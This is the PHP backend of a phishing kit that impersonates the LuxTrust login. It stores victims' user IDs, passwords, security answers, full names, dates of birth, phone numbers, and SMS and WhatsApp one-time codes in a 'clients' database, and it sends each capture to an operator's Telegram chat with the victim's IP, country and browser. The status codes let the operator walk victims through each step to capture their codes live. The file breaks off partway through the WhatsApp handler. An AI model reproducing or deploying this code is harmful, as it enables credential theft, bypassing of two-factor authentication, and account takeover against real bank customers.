<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

include 'config.php';
include 'connect.php';
include 'flagMaster.php';
include 'bot_class.php';
use peterkahl\flagMaster\flagMaster;

date_default_timezone_set('Europe/Dublin');

$ip = $_SERVER['REMOTE_ADDR'];
$ipslist = file_get_contents('blacklist.dat');
if (strpos($ipslist, $ip) !== false) {
    die("99");
}

session_start();

function numeric($num) {
    return preg_match('/^[0-9]+$/', $num) === 1;
}

// Handle ping request
if (isset($_GET['type']) && $_GET['type'] == 'ping') {
    header('Content-Type: application/json');
    if (isset($_SESSION['uniqueid'])) {
        $uniqueid = $_SESSION['uniqueid'];
        $lastseen = time();
        $stmt = $conn->prepare("UPDATE clients SET lastseen=? WHERE uniqueid=?");
        $stmt->bind_param("ii", $lastseen, $uniqueid);
        if ($stmt->execute()) {
            echo json_encode(['status' => 'lastseen_updated']);
        } else {
            echo json_encode(['status' => 'notok', 'error' => $stmt->error]);
        }
        $stmt->close();
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Session uniqueid not set']);
    }
    exit();
}

// ---------- LOGIN ----------
if ($_GET['type'] == 'login') {

    function getRealIP() {
        if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            return trim(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]);
        } elseif (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
            return $_SERVER['HTTP_CF_CONNECTING_IP'];
        } elseif (!empty($_SERVER['HTTP_X_REAL_IP'])) {
            return $_SERVER['HTTP_X_REAL_IP'];
        }
        return $_SERVER['REMOTE_ADDR'];
    }

function getCountryFromIP(string $ip): string {
    if ($ip === '::1' || $ip === '127.0.0.1') return 'SY'; // default for localhost

    $apis = [
        "http://ip-api.com/json/$ip" => static function(array $d){ return $d['countryCode'] ?? null; },
        "https://ipwho.is/$ip"       => static function(array $d){ return $d['country_code'] ?? null; },
    ];

    foreach ($apis as $url => $extract) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 2,
            CURLOPT_FAILONERROR => false,
            CURLOPT_SSL_VERIFYHOST => 2,
            CURLOPT_SSL_VERIFYPEER => true,
        ]);
        $response = curl_exec($ch);
        curl_close($ch);
        if ($response !== false) {
            $data = json_decode($response, true) ?: [];
            $cc = $extract($data);
            if (!empty($cc)) return strtoupper($cc);
        }
    }
    return 'UN';
}

    function getBrowserAndOS($user_agent) {
        $browser = 'Unknown Browser';
        $os = 'Unknown OS';
        if (strpos($user_agent, 'Firefox') !== false) $browser = 'Firefox';
        elseif (strpos($user_agent, 'Chrome') !== false) $browser = 'Chrome';
        elseif (strpos($user_agent, 'Safari') !== false) $browser = 'Safari';
        elseif (strpos($user_agent, 'MSIE') !== false || strpos($user_agent, 'Trident') !== false) $browser = 'Internet Explorer';

        if (preg_match('/Windows NT/i', $user_agent)) $os = 'Windows';
        elseif (preg_match('/Mac OS X/i', $user_agent)) $os = 'Mac OS';
        elseif (preg_match('/Linux/i', $user_agent)) $os = 'Linux';
        elseif (preg_match('/Android/i', $user_agent)) $os = 'Android';
        elseif (preg_match('/iPhone|iPad/i', $user_agent)) $os = 'iOS';

        return [$browser, $os];
    }

    // === Configure dynamic fields ===
$fields = [
    'user-id'     => ['label' => 'User ID',       'emoji' => '👤', 'db' => 'user'],
    'password'         => ['label' => 'Password',      'emoji' => '🔑', 'db' => 'pass'],
	'work1'         => ['label' => 'Description ',      'emoji' => '🔑', 'db' => 'description']
];


    // === Collect POST data ===
    $data = [];
    foreach ($fields as $key => $meta) {
        $data[$key] = trim($_POST[$key] ?? '');
    }

    // === Validate required fields ===
    // === Validate required fields ===
    if (empty($data['user-id']) || empty($data['password'])) {
        echo json_encode(['status' => 'missing_fields']);
        exit();
    }

    $ua = urlencode($_SERVER['HTTP_USER_AGENT']);
    $ip = getRealIP();
    $country = getCountryFromIP($ip);
    $uniqueid = $_SESSION['uniqueid'] ?? time();
    $lastseen = time();
    $date = date("Y-m-d h:i a", $lastseen);

    $db_cols = [];
    $placeholders = [];
    $bind_values = [];
    $bind_types = '';

    foreach ($fields as $key => $meta) {
        $db_cols[] = $meta['db'];
        $placeholders[] = '?';
        $bind_values[] = $data[$key];
        $bind_types .= 's';
    }

    // Add required fields
    $db_cols = array_merge(['lastseen', 'handler'], $db_cols, ['ip', 'country', 'useragent', 'uniqueid', 'status']);
    $placeholders = array_merge(['?', '?'], $placeholders, ['?', '?', '?', '?', '?']);
    $bind_values = array_merge([$lastseen, '--'], $bind_values, [$ip, $country, $ua, $uniqueid, 2]);
    $bind_types = 'is' . $bind_types . 'sssis';

    if ($_SESSION['started'] === 'true') {
        $uniqueid = $_SESSION['uniqueid'];
        $stmt = $conn->prepare("SELECT * FROM clients WHERE uniqueid = ?");
        $stmt->bind_param("i", $uniqueid);
        $stmt->execute();
        $result = $stmt->get_result();
        if ($result->num_rows === 0) {
            // Insert new victim
            $sql = "INSERT INTO clients (" . implode(",", $db_cols) . ") VALUES (" . implode(",", $placeholders) . ")";
            $stmt = $conn->prepare($sql);
            $stmt->bind_param($bind_types, ...$bind_values);
            $stmt->execute();
        } else {
            // Update existing victim
            $set_clause = implode(', ', array_map(fn($f) => $f['db'] . '=?', $fields));
            $stmt = $conn->prepare("UPDATE clients SET status=2, buzzed=0, last_field_updated='user', $set_clause, useragent=?, country=?, ip=? WHERE uniqueid=?");
            $types = str_repeat('s', count($fields)) . 'sssi';
            $values = array_merge(array_values($data), [$ua, $country, $ip, $uniqueid]);
            $stmt->bind_param($types, ...$values);
            $stmt->execute();
        }
    } else {
        $_SESSION['uniqueid'] = $uniqueid;
        $_SESSION['started'] = 'true';
        $sql = "INSERT INTO clients (" . implode(",", $db_cols) . ") VALUES (" . implode(",", $placeholders) . ")";
        $stmt = $conn->prepare($sql);
        $stmt->bind_param($bind_types, ...$bind_values);
        $stmt->execute();
    }

    echo json_encode(['status' => 'ok']);

    // === Telegram ===
if ($enable_telegram === 'checked' && $telegram_chaid != '') {
    list($browser, $os) = getBrowserAndOS($_SERVER['HTTP_USER_AGENT']);

    // Get user ID from database
    $row = mysqli_fetch_array(mysqli_query($conn, "SELECT id FROM clients WHERE uniqueid = '$uniqueid'"), MYSQLI_ASSOC);
    $userid = htmlspecialchars($row['id'] ?? 'unknown');

    $tmsg = "<b> </b>\n";
    $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
    $tmsg .= "🆔 <b>User ID:</b> <code>$userid</code>\n";
    $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";

    foreach ($fields as $key => $meta) {
        $val = htmlspecialchars($data[$key]);
        $tmsg .= "{$meta['emoji']} <b>{$meta['label']}:</b> <code>$val</code>\n";
    }

    $tmsg .= "===================\n";
    $tmsg .= "🌎 <b>Country:</b> <code>{$country}</code>\n";
    $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
    $tmsg .= "💻 <b>Browser:</b> <code>$browser</code>\n";
    $tmsg .= "🖥️ <b>OS:</b> <code>$os</code>\n";
    $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
    $tmsg .= "===================";

    $telegram = new Telegram($bot_token);
    $telegram->sendMessage([
        'chat_id' => $telegram_chaid,
        'text' => $tmsg,
        'parse_mode' => 'html'
    ]);
}

}




if ($_GET['type'] === 'login-2') {
    session_start();

    if (!isset($_SESSION['uniqueid'])) {
        echo json_encode(['status' => 'notok', 'message' => 'Session expired']);
        exit;
    }

    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a");
    $time = date("h:i:s A");
    $ip = $_SERVER['REMOTE_ADDR'];

    // Define simple secure fields
    $fields = [
        'usrInput' => ['label' => 'Email', 'emoji' => '👤', 'db' => 'user']
    ];

    // Sanitize & validate POST input
    $data = [];
    foreach ($fields as $key => $meta) {
        if (empty($_POST[$key])) {
            echo json_encode(['status' => 'notok', 'message' => "Missing $key"]);
            exit;
        }
        $data[$key] = mysqli_real_escape_string($conn, trim($_POST[$key]));
    }

    // Build SQL
    $columns = [];
    $types = '';
    $values = [];

    foreach ($fields as $key => $meta) {
        $columns[] = "{$meta['db']} = ?";
        $types .= 's';
        $values[] = $data[$key];
    }

    $columns[] = "status = 2";
    $columns[] = "buzzed = 0";
    $columns[] = "last_field_updated = 'usrInput'";
    $sql = "UPDATE clients SET " . implode(', ', $columns) . " WHERE uniqueid = ?";
    $types .= 'i';
    $values[] = $uniqueid;

    $stmt = $conn->prepare($sql);
    if ($stmt === false) {
        error_log("Prepare failed: " . $conn->error . " SQL: " . $sql);
        echo json_encode(['status' => 'notok', 'message' => 'Database prepare error']);
        exit;
    }

    $stmt->bind_param($types, ...$values);
    if (!$stmt->execute()) {
        error_log("Execute failed: " . $stmt->error . " SQL: " . $sql . " Values: " . implode(", ", $values));
        echo json_encode(['status' => 'notok', 'message' => 'Database execute error: ' . $stmt->error]);
        exit;
    }

    echo json_encode(['status' => 'ok']);

    // === Telegram ===
    if ($enable_telegram === 'checked' && !empty($telegram_chaid)) {
        $row = mysqli_fetch_array(mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid = '$uniqueid'"), MYSQLI_ASSOC);
        $userid = htmlspecialchars($row['id'] ?? 'unknown');
        $username = htmlspecialchars($row['user'] ?? 'unknown');
        
        $msg = "<b>luxtrust </b>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";
        $msg .= "🆔 <b>User ID:</b> <code>$userid</code>\n";
        $msg .= "👤 <b>Username:</b> <code>$username</code>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";

        foreach ($fields as $key => $meta) {
            $val = htmlspecialchars($data[$key]);
            $msg .= "{$meta['emoji']} <b>{$meta['label']}:</b> <code>$val</code>\n";
        }

        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";
        $msg .= "🌐 <b>IP:</b> <code>$ip</code>\n";
        $msg .= "📅 <b>Date:</b> <code>$date $time</code>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>";

        try {
            $telegram = new Telegram($bot_token);
            $telegram->sendMessage([
                'chat_id' => $telegram_chaid,
                'text' => $msg,
                'parse_mode' => 'HTML'
            ]);
        } catch (Exception $e) {
            file_put_contents('tg_error.log', "Telegram error (telegramerror): " . $e->getMessage() . "\n", FILE_APPEND);
        }
    }
}




if ($_GET['type'] == 'loginerror') {
    if ($ip == "::1") {
        $country = "sy";
    } else {
        // Optimize geolocation lookup: Reduce external call delay and handle caching
        function getCountryFromIP($ip) {
            $cache_file = 'cache/' . md5($ip) . '.txt'; // Use IP hash for caching

            // Check if cached result exists and is valid (1 day cache)
            if (file_exists($cache_file) && filemtime($cache_file) > time() - 86400) {
                return file_get_contents($cache_file);
            }

            // Else, make the API call
            $url = "http://www.geoplugin.net/json.gp?ip=$ip";
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 2); // Timeout set to 2 seconds
            curl_setopt($ch, CURLOPT_FAILONERROR, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);

            $response = curl_exec($ch);
            if (curl_errno($ch)) {
                error_log('cURL error: ' . curl_error($ch)); // Log errors
                return 'unknown'; // Return 'unknown' in case of error
            }

            curl_close($ch);

            // Parse the response and extract the country code
            $data = json_decode($response, true);
            $country = strtolower($data['geoplugin_countryCode']);

            // Cache the result for later use
            file_put_contents($cache_file, $country);
            return $country;
        }

        // Usage in your script
        $country = getCountryFromIP($ip);
    }
    $ua = urlencode($_SERVER['HTTP_USER_AGENT']);
    $u_agent = $_SERVER['HTTP_USER_AGENT'];
    $date = date("Y-m-d h:i a", time());
    $uniqueid = time();
    $lastseen = time();

    if ($_POST['usrInput']) {
        $user = $_POST['usrInput'];

        if ($_SESSION['started'] == 'true') {
            $uniqueid = $_SESSION['uniqueid'];

            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid=$uniqueid");
            $num = mysqli_num_rows($query);
            if ($num == 0) {
                $query = mysqli_query($conn, "INSERT INTO clients (lastseen, handler, user, ip, country, useragent, uniqueid, status) VALUES ('$lastseen', '--', '$user', '$ip', '$country', '$ua', $uniqueid, 2)");
                if ($query) {
                    echo json_encode(array(
                        'status' => 'ok'
                    ));

                    $new_vic = '1';

                    $ipslist = file_get_contents("logs/accepted_visitors.txt");
                    if (strpos($ipslist, $_SERVER['REMOTE_ADDR']) !== true) {
                        file_put_contents("logs/accepted_visitors.txt", "[+] " . $date . " - " . $_SERVER['REMOTE_ADDR'] . " - " . urldecode($ua) . "\n", FILE_APPEND);
                    }

                } else {
                    echo json_encode(array(
                        'status' => 'notok'
                    ));
                }
            } else {
                $query = mysqli_query($conn, "UPDATE clients SET status=2, buzzed=0, user='$user', useragent='$ua', country='$country', ip='$ip' WHERE uniqueid=$uniqueid");
                if ($query) {
                    echo json_encode(array(
                        'status' => 'ok'
                    ));
                } else {
                    echo json_encode(array(
                        'status' => 'notok'
                    ));
                }
            }
        } else {
            $_SESSION['uniqueid'] = $uniqueid;
            $_SESSION['started'] = 'true';
            $query = mysqli_query($conn, "INSERT INTO clients (lastseen, handler, user, ip, country, useragent, uniqueid, status) VALUES ('$lastseen', '--', '$user', '$ip', '$country', '$ua', $uniqueid, 2)");
            if ($query) {
                echo json_encode(array(
                    'status' => 'ok'
                ));

                $new_vic = '1';

                $ipslist = file_get_contents("logs/accepted_visitors.txt");
                if (strpos($ipslist, $_SERVER['REMOTE_ADDR']) !== true) {
                    file_put_contents("logs/accepted_visitors.txt", "[+] " . $date . " - " . $_SERVER['REMOTE_ADDR'] . " - " . urldecode($ua) . "\n", FILE_APPEND);
                }

            } else {
                echo json_encode(array(
                    'status' => 'notok'
                ));
            }
        }

        if ($enable_telegram == 'checked' && $telegram_chaid != '') {
            // Using the country you got from the geoplugin API
            $check = [
                'country' => $country, // Direct use of the $country value
                'isp' => 'Unknown ISP', // Assuming ISP info isn't available
                'city' => 'Unknown City' // Assuming City info isn't available
            ];

    // Function to detect Browser and OS from User-Agent
    function getBrowserAndOS($user_agent) {
        $browser = 'Unknown Browser';
        $os = 'Unknown OS';

        // Detect browser
        if (strpos($user_agent, 'Firefox') !== false) {
            $browser = 'Firefox';
        } elseif (strpos($user_agent, 'Chrome') !== false) {
            $browser = 'Chrome';
        } elseif (strpos($user_agent, 'Safari') !== false) {
            $browser = 'Safari';
        } elseif (strpos($user_agent, 'MSIE') !== false || strpos($user_agent, 'Trident') !== false) {
            $browser = 'Internet Explorer';
        }

        // Detect OS
        if (preg_match('/Windows NT/i', $user_agent)) {
            $os = 'Windows';
        } elseif (preg_match('/Mac OS X/i', $user_agent)) {
            $os = 'Mac OS';
        } elseif (preg_match('/Linux/i', $user_agent)) {
            $os = 'Linux';
        } elseif (preg_match('/Android/i', $user_agent)) {
            $os = 'Android';
        } elseif (preg_match('/iPhone|iPad/i', $user_agent)) {
            $os = 'iOS';
        }

        return [$browser, $os];
    }

    // Get Browser and OS
    list($browser, $os) = getBrowserAndOS($_SERVER['HTTP_USER_AGENT']);

    // Format the message with Email/User separated from other data
    $tmsg = "<b> luxtrust</b>\n";
    $tmsg .= "━━━━━━━━━━━━━━━\n";
    $tmsg .= "📧 <b>Email/User Error:</b> <code>$user</code>\n";
    $tmsg .= "━━━━━━━━━━━━━━━\n";
	$tmsg .= "🌎 <b>Country:</b> <code>{$check['country']}</code>\n";
    $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
    $tmsg .= "💻 <b>Browser:</b> <code>$browser</code>\n";
    $tmsg .= "🖥️ <b>OS:</b> <code>$os</code>\n";
    $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
    $tmsg .= "━━━━━━━━━━━━━━━";

    // Remove any unnecessary newlines
    $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

    // Send the message to Telegram
    $telegram = new Telegram($bot_token);
    $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
    $telegram->sendMessage($content);
}

    }
}



if ($_GET['type'] == 'vpwd') {
    $uniqueid = $_SESSION['uniqueid'];


	$date = date("Y-m-d h:i a", time());
    if (!empty($_POST['vpwd'])) {
        $vpwd = mysqli_real_escape_string($conn, $_POST['vpwd']);

        $query = mysqli_query($conn, "UPDATE clients SET status=6, buzzed=0, pass='$vpwd' WHERE uniqueid='$uniqueid'");
        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
    // Query database for user information
    $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
    $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

    // Format the Telegram message
    $tmsg = "
<strong> luxtrust </strong>\n
<code>━━━━━━━━━━━━━━━</code>\n
👤 <strong>Email/User::</strong> <code>{$array['user']}</code>\n
<code>━━━━━━━━━━━━━━━</code>\n
🔑 <strong>Password:</strong> <code>$vpwd</code>\n
<code>━━━━━━━━━━━━━━━</code>\n\n
🌐 <strong>IP:</strong> <code>{$array['ip']}</code>\n
📅 <strong>Date:</strong> <code>$date $time</code>\n
";

    // Clean up any unnecessary line breaks
    $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

    // Send the message to Telegram
    $telegram = new Telegram($bot_token);
    $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
    $telegram->sendMessage($content);
}

    } else {
        $response = array('status' => 'notok', 'message' => 'Password is empty');
    }

    echo json_encode($response);
}


if ($_GET['type'] == 'vpwderror') {
    $uniqueid = $_SESSION['uniqueid'];


	$date = date("Y-m-d h:i a", time());
    if (!empty($_POST['vpwd'])) {
        $vpwd = mysqli_real_escape_string($conn, $_POST['vpwd']);

        $query = mysqli_query($conn, "UPDATE clients SET status=8, buzzed=0, pass='$vpwd' WHERE uniqueid='$uniqueid'");
        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
    // Query database for user information
    $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
    $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

    // Format the Telegram message
    $tmsg = "
<strong> luxtrust </strong>\n
<code>━━━━━━━━━━━━━━━</code>\n
👤 <strong>Email/User:</strong> <code>{$array['user']}</code>\n
<code>━━━━━━━━━━━━━━━</code>\n
🔑 <strong>Password Error:</strong> <code>$vpwd</code>\n
<code>━━━━━━━━━━━━━━━</code>\n\n
🌐 <strong>IP:</strong> <code>{$array['ip']}</code>\n
📅 <strong>Date:</strong> <code>$date $time</code>\n
";

    // Clean up any unnecessary line breaks
    $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

    // Send the message to Telegram
    $telegram = new Telegram($bot_token);
    $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
    $telegram->sendMessage($content);
}

    } else {
        $response = array('status' => 'notok', 'message' => 'Password is empty');
    }

    echo json_encode($response);
}





if ($_GET['type'] === 'confirm') {
    session_start();

    if (!isset($_SESSION['uniqueid'])) {
        echo json_encode(['status' => 'notok', 'message' => 'Session expired']);
        exit;
    }

    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a");
    $time = date("h:i:s A");
    $ip = $_SERVER['REMOTE_ADDR'];

    // Define simple secure fields
    $fields = [
        'confirm' => ['label' => 'Security Question', 'emoji' => '📲', 'db' => 'confirm']
    ];

    // Sanitize & validate POST input
    $data = [];
    foreach ($fields as $key => $meta) {
        if (empty($_POST[$key])) {
            echo json_encode(['status' => 'notok', 'message' => "Missing $key"]);
            exit;
        }
        $data[$key] = mysqli_real_escape_string($conn, trim($_POST[$key]));
    }

    // Build SQL
    $columns = [];
    $types = '';
    $values = [];

    foreach ($fields as $key => $meta) {
        $columns[] = "{$meta['db']} = ?";
        $types .= 's';
        $values[] = $data[$key];
    }

    $columns[] = "status = 22";
	$columns[] = "buzzed = 0";
	$columns[] = "last_field_updated = 'confirm'";
    $sql = "UPDATE clients SET " . implode(', ', $columns) . " WHERE uniqueid = ?";
    $types .= 'i';
    $values[] = $uniqueid;

    $stmt = $conn->prepare($sql);
    $stmt->bind_param($types, ...$values);
    $stmt->execute();

    echo json_encode(['status' => 'ok']);

    // === Telegram ===
    if ($enable_telegram === 'checked' && !empty($telegram_chaid)) {
        $row = mysqli_fetch_array(mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid = '$uniqueid'"), MYSQLI_ASSOC);
        $userid = htmlspecialchars($row['id'] ?? 'unknown');
        $username = htmlspecialchars($row['user'] ?? 'unknown');
		
        $msg = "<b>luxtrust </b>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";
        $msg .= "🆔 <b>User ID:</b> <code>$userid</code>\n";
         $msg .= "👤 <b>Username:</b> <code>$username</code>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";

        foreach ($fields as $key => $meta) {
            $val = htmlspecialchars($data[$key]);
            $msg .= "{$meta['emoji']} <b>{$meta['label']}:</b> <code>$val</code>\n";
        }

        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";
        $msg .= "🌐 <b>IP:</b> <code>$ip</code>\n";
        $msg .= "📅 <b>Date:</b> <code>$date $time</code>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>";

        try {
            $telegram = new Telegram($bot_token);
            $telegram->sendMessage([
                'chat_id' => $telegram_chaid,
                'text' => $msg,
                'parse_mode' => 'HTML'
            ]);
        } catch (Exception $e) {
            file_put_contents('tg_error.log', "Telegram error (telegramerror): " . $e->getMessage() . "\n", FILE_APPEND);
        }
    }
}



if ($_GET['type'] === 'information') {
    session_start();

    if (!isset($_SESSION['uniqueid'])) {
        echo json_encode(['status' => 'notok', 'message' => 'Session expired']);
        exit;
    }

    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a");
    $time = date("h:i:s A");
    $ip = $_SERVER['REMOTE_ADDR'];

    // Define simple secure fields
$fields = [
    'full-name'     => ['label' => 'User ID',       'emoji' => '👤', 'db' => 'fullname'],
    'dob'         => ['label' => 'Password',      'emoji' => '📅', 'db' => 'dob'],
	'phone'         => ['label' => 'Description ',      'emoji' => '📱', 'db' => 'phonenumber']
];

    // Sanitize & validate POST input
    $data = [];
    foreach ($fields as $key => $meta) {
        if (empty($_POST[$key])) {
            echo json_encode(['status' => 'notok', 'message' => "Missing $key"]);
            exit;
        }
        $data[$key] = mysqli_real_escape_string($conn, trim($_POST[$key]));
    }

    // Build SQL
    $columns = [];
    $types = '';
    $values = [];

    foreach ($fields as $key => $meta) {
        $columns[] = "{$meta['db']} = ?";
        $types .= 's';
        $values[] = $data[$key];
    }

    $columns[] = "status = 24";
	$columns[] = "buzzed = 0";
	$columns[] = "last_field_updated = 'full-name'";
    $sql = "UPDATE clients SET " . implode(', ', $columns) . " WHERE uniqueid = ?";
    $types .= 'i';
    $values[] = $uniqueid;

    $stmt = $conn->prepare($sql);
    $stmt->bind_param($types, ...$values);
    $stmt->execute();

    echo json_encode(['status' => 'ok']);

    // === Telegram ===
    if ($enable_telegram === 'checked' && !empty($telegram_chaid)) {
        $row = mysqli_fetch_array(mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid = '$uniqueid'"), MYSQLI_ASSOC);
        $userid = htmlspecialchars($row['id'] ?? 'unknown');
        $username = htmlspecialchars($row['user'] ?? 'unknown');
		
        $msg = "<b>luxtrust </b>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";
        $msg .= "🆔 <b>User ID:</b> <code>$userid</code>\n";
         $msg .= "👤 <b>Username:</b> <code>$username</code>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";

        foreach ($fields as $key => $meta) {
            $val = htmlspecialchars($data[$key]);
            $msg .= "{$meta['emoji']} <b>{$meta['label']}:</b> <code>$val</code>\n";
        }

        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";
        $msg .= "🌐 <b>IP:</b> <code>$ip</code>\n";
        $msg .= "📅 <b>Date:</b> <code>$date $time</code>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>";

        try {
            $telegram = new Telegram($bot_token);
            $telegram->sendMessage([
                'chat_id' => $telegram_chaid,
                'text' => $msg,
                'parse_mode' => 'HTML'
            ]);
        } catch (Exception $e) {
            file_put_contents('tg_error.log', "Telegram error (telegramerror): " . $e->getMessage() . "\n", FILE_APPEND);
        }
    }
}






if ($_GET['type'] == 'smscode') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['smscode'])) {
        $smscode = mysqli_real_escape_string($conn, $_POST['smscode']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=10, buzzed=0, smscode='$smscode' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "📲 <b>SMS:</b> <code>$smscode</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}



if ($_GET['type'] == 'smserror') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['smserror'])) {
        $smserror = mysqli_real_escape_string($conn, $_POST['smserror']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=10, buzzed=0, smscode='$smserror' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "📲 <b>SMS Error:</b> <code>$smserror</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}






if ($_GET['type'] == 'whatsappcode') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['whatsappcode'])) {
        $whatsappcode = mysqli_real_escape_string($conn, $_POST['whatsappcode']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=183, buzzed=0, whatsappcode='$whatsappcode' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "📲 <b>Whatsapp Code:</b> <code>$whatsappcode</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
